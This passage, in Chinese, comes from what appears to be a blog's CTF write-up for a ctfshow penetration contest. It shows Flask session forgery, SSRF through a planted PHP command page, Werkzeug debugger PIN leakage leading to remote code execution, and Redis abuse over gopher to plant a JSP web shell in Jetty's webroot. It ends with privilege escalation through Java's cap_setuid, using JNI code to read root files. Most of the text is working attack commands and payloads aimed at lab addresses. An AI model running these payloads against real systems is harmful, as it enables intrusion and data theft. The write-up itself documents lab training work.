class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_log_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>这里我们获取到了一个session值，看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiZ3Vlc3QifQ.Z3zuOw.FYFsUkqCVKObwblDG85AR5G7PRI</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107170758420.png" class="" title="This is an example image"><p>第一题我们的重点是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/key&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/log_server_key.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            key = f.read()</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;key&#x27;</span>: key&#125;</span><br></pre></td></tr></table></figure><p>那就是session伪造嘛。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107171222896.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg</span><br></pre></td></tr></table></figure><p>然后我们需要携带cookie访问&#x2F;key路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://172.2.78.5/cmd.php?0=curl+http://172.2.78.6:8888/key+--cookie+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3zvxA.3ctTGQeEHdsYY66hbZKoftfwOLg&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250107172121397.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提交flask所在服务器的/etc/passwd 文件最后一行内容</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/set_log_option&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_log_option</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logName = request.args.get(<span class="string">&#x27;logName&#x27;</span>)</span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    app_log = logging.getLogger(logName)</span><br><span class="line">    app_log.addHandler(logging.FileHandler(<span class="string">&#x27;./log/&#x27;</span> + logFile))</span><br><span class="line">    app_log.setLevel(logging.INFO)</span><br><span class="line">    clear_log_file(<span class="string">&#x27;./log/&#x27;</span> + logFile)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log option set successfully&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_log_content&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_log_content</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check_session():</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;not authorized&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    logFile = request.args.get(<span class="string">&#x27;logFile&#x27;</span>)</span><br><span class="line">    path = join(<span class="string">&#x27;log&#x27;</span>, basename(logFile))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;log content&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: content&#125;</span><br></pre></td></tr></table></figure><p>这里打pin码泄露，创建一个日志，然后把pin码打印到日志。</p><p>设置loggername为werkzeug记录flask的日志（不知道的可以打个断点看一下，在logdict里有）</p><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250106215946821-295044882.png" alt="img"></p><p>查一下就可以知道这个logger可以记录flask的日志，那么打印出来的pin就会出现在日志中，然后getlogcontent即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#设置log</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/set_log_option%3flogName=werkzeug%2526logFile=jwk.log&quot;&#x27;);</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124161450305.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#获取console的页面key</span><br><span class="line">http://172.2.95.5/1.php?1=system(&#x27;curl+-b+&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot;+&quot;http://172.2.95.6:8888/console&quot;&#x27;);</span><br><span class="line"></span><br><span class="line">BDrrhrw6TzJCcFsCz6dj</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150000597.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打印pin码到日志</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=printpin&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXByaW50cGluJnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150445453.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124150510020.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读log</span><br><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/get_log_content?logFile=jwk.log&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9nZXRfbG9nX2NvbnRlbnQ/bG9nRmlsZT1qd2subG9nIg==</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162224929.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">375-828-345</span><br></pre></td></tr></table></figure><p>终于读到pin了，卡了好久。。。</p><p>然后我们pinauth一下，获取cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br><span class="line"></span><br><span class="line">Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aNU5GeFEubnFyeTdYZmlYSmxaVUtDY2V6TmpLTGVfd0QwIiAiaHR0cDovLzE3Mi4yLjk1LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTM3NS04MjgtMzQ1JnM9QkRycmhydzZUekpDY0ZzQ3o2ZGoi</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162404620.png" class="" title="This is an example image"><p>显示auth为true，验证成功，这里我们保存cookie的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -c cookie.txt -v -b  &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z5NFxQ.nqry7XfiXJlZUKCcezNjKLe_wD0&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=375-828-345&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124162717034.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__wzdc58fd521ffb0cae532091737707116|910ebc3905cd</span><br></pre></td></tr></table></figure><p>然后进行rce：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b &quot;__wzdc58fd521ffb0cae53209=1737707116|910ebc3905cd&quot; &quot;http://172.2.95.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/jwk.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=BDrrhrw6TzJCcFsCz6dj&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163537697.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124163641184.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102184258603.png" class="" title="This is an example image"><p>扫到一个java服务。jetty，没什么其他的，看看是否存在版本漏洞。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185318086.png" class="" title="This is an example image"><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250102185324743.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow_2025</span><br></pre></td></tr></table></figure><p>CVE-2021-28164</p><p><strong>提交 &#x2F;dylan.txt 中的key</strong></p><p>既然我们获得了redis的密码，那么我们接下来登录redis</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://172.2.229.7:6380/auth:ctfshow_2025</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124164152106.png" class="" title="This is an example image"><p><img src="https://img2024.cnblogs.com/blog/3392505/202501/3392505-20250108131824159-136678188.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename hack.jsp</span><br><span class="line">set xxx &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher://172.2.95.7:6380/_auth%20ctfshow_2025%0aconfig%20set%20dir%20%2fopt%2fjetty%2fwebapps%2fROOT%2f%0aconfig%20set%20dbfilename%20hack.jsp%0aset%20xxx%20%22%3c%25%20Runtime.getRuntime().exec(new%20String%5b%5d%7b%5c%22sh%5c%22%2c%5c%22-c%5c%22%2crequest.getParameter(%5c%22cmd%5c%22)%7d)%3b%25%3e%22%0asave%0aquit&quot;</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165521240.png" class="" title="This is an example image"><p>不出意外写马是成功的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165632050.png" class="" title="This is an example image"><p>然后去访问1.txt即可。</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124165700581.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b11a7ae330883cb5bf667a9c1604635</span><br></pre></td></tr></table></figure><p><strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>一眼需要提权！</p><p>列出文件能力：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.95.7:8080/hack.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt; /opt/jetty/webapps/ROOT/cap.txt</span><br></pre></td></tr></table></figure><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124170452149.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/openjdk-8/bin/java = cap_setuid+ep</span><br></pre></td></tr></table></figure><p>好东西，java有setuid能力</p><p>写入 SetUID.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line">//1111111111122</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL Java_SetUID_setUID(JNIEnv *env, jobject obj, jint uid) &#123;</span><br><span class="line">    return setuid(uid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#不知道为啥这里要注释一行才行，，，</span><br></pre></td></tr></table></figure><p>写入SetUID.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=echo%20&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;%20|base64%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=javac%<span class="number">20</span>/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.jsp?cmd=java%<span class="number">20</span>-Djava.library.path=/opt/jetty/webapps/ROOT/%<span class="number">20</span>-cp%<span class="number">20</span>/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p>成功读取root下面的txt文件</p><img src="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/image-20250124172301657.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash长度拓展攻击</title>
      <link href="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
